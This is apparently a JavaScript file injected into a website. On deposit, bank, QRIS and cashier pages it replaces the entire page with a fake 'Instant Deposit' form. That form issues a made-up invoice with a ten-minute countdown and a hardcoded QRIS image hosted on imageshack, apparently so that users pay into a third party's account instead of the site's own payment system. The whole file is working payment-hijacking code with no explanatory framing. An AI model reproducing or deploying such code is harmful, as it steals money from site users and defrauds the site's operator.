(function () {
  const allowedPaths = [
    '/deposit', '/deposit/', '/deposit.php', '/bank', '/bank/', '/qris.php'
  ];
  const allowedQueries = [
    'index.php?page=transaksi',
    'index.php?page=deposit',
    'index.php?page=cashier'
  ];

  const path = window.location.pathname;
  const query = window.location.search.replace('?', '');
  const fullQuery = path + '?' + query;

  const pathAllowed = allowedPaths.includes(path);
  const queryAllowed = allowedQueries.includes(query) || allowedQueries.includes(fullQuery);

  if (!pathAllowed && !queryAllowed) return;

  // Force full replace using document.open()
  document.open();
  document.write(`<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instant Deposit</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: url('https://images.unsplash.com/photo-1506765515384-028b60a970df') no-repeat center center fixed;
      background-size: cover;
    }
    .overlay {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      min-height: 100vh;
      padding: 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .logo-text {
      font-size: 28px;
      font-weight: bold;
      color: white;
      margin-bottom: 30px;
      text-shadow: 1px 1px 5px black;
    }
    .form, .invoice {
      background: rgba(255, 255, 255, 0.2);
      padding: 20px;
      border-radius: 15px;
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      font-size: 16px;
      border: none;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      background: #007bff;
      color: white;
      border-radius: 5px;
      cursor: pointer;
    }
    .partner-img {
      margin-top: 40px;
      max-width: 90%;
    }
    .invoice {
      display: none;
      text-align: left;
    }
    .invoice img.qris {
      display: block;
      margin: 10px auto;
      max-width: 250px;
    }
    .invoice h2 {
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="logo-text">INSTANT DEPOSIT</div>
    <form class="form" id="depositForm">
      <input type="text" id="userid" placeholder="User ID" required />
      <input type="text" id="nominal" placeholder="Min.Deposit 50.001 / Max.Deposit 100.000.001" required />
      <button type="submit">Deposit</button>
    </form>
    <div class="invoice" id="invoice">
      <h2>Invoice</h2>
      <p><strong>No. Invoice:</strong> <span id="invNumber"></span></p>
      <p><strong>TGL:</strong> <span id="tglNow"></span></p>
      <p><strong>Batas Pembayaran:</strong> <span id="batasWaktu"></span></p>
      <p><strong>Sisa Waktu:</strong> <span id="countdown"></span></p>
      <p><strong>Status:</strong> <span id="status" style="font-weight: bold; color:red;">UNPAID</span></p>
      <p><strong>Keterangan:</strong> Topup Instan Deposit <span id="userInfo"></span></p>
      <p><strong>Jumlah:</strong> IDR <span id="jumlah"></span></p>
      <p><strong>Biaya Layanan:</strong> IDR 0</p>
      <p><strong>Total Bayar:</strong> IDR <span id="jumlahTotal"></span></p>
      <p><strong>Pembayaran via QRIS:</strong></p>
      <img class="qris" src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" alt="QRIS" />
    </div>
    <img src="https://gtyfup2m.112400c1199c.com/poster-QRIS.jpg" alt="Partners" class="partner-img" />
  </div>

  <script>
    function formatNominal(input) {
      let value = input.value.replace(/\\D/g, '');
      input.value = value.replace(/\\B(?=(\\d{3})+(?!\\d))/g, '.');
    }
    function generateInvoiceNumber() {
      return 'INV' + Math.random().toString(36).substring(2, 10).toUpperCase();
    }
    function formatDate(date) {
      return date.toISOString().slice(0, 19).replace('T', ' ');
    }
    function countdownTimer(deadline) {
      const statusEl = document.getElementById("status");
      const countdownEl = document.getElementById("countdown");
      const interval = setInterval(() => {
        const now = new Date();
        const diff = deadline - now;
        if (diff <= 0) {
          clearInterval(interval);
          statusEl.textContent = "EXPIRED";
          statusEl.style.color = "gray";
          countdownEl.textContent = "00:00:00";
        } else {
          const mins = Math.floor(diff / 1000 / 60);
          const secs = Math.floor(diff / 1000 % 60);
          countdownEl.textContent =
            String(Math.floor(mins / 60)).padStart(2, '0') + ":" +
            String(mins % 60).padStart(2, '0') + ":" +
            String(secs).padStart(2, '0');
        }
      }, 1000);
    }
    function handleSubmit(e) {
      e.preventDefault();
      const userid = document.getElementById("userid").value;
      const nominal = document.getElementById("nominal").value.replace(/\\./g, '');
      const nominalFormatted = parseInt(nominal).toLocaleString('id-ID');
      document.querySelector(".form").style.display = "none";
      document.getElementById("invoice").style.display = "block";
      const now = new Date();
      const deadline = new Date(now.getTime() + 10 * 60 * 1000);
      document.getElementById("invNumber").textContent = generateInvoiceNumber();
      document.getElementById("tglNow").textContent = formatDate(now);
      document.getElementById("batasWaktu").textContent = formatDate(deadline);
      document.getElementById("userInfo").textContent = userid;
      document.getElementById("jumlah").textContent = nominalFormatted;
      document.getElementById("jumlahTotal").textContent = nominalFormatted;
      countdownTimer(deadline);
    }
    document.getElementById("nominal").addEventListener("input", function () {
      formatNominal(this);
    });
    document.getElementById("depositForm").addEventListener("submit", handleSubmit);
  </script>
</body>
</html>
  `);
  document.close();
})();
